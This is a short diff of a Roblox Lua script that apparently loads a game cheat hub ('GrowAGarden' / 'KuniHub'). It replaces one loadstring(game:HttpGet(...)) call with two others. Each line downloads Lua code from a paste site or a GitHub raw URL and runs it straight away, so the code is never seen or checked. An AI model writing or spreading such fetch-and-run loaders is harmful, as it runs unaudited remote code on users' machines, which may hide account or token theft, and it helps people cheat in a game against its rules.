@@ -1,1 +1,2 @@
-loadstring(game:HttpGet("https://pastefy.app/A18ZHSnO/raw"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KuniDevLua/GrowAGarden/refs/heads/main/NewGuiKuniHub"))()
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/pnxa6wfgq6Zljd7b/raw", true))()
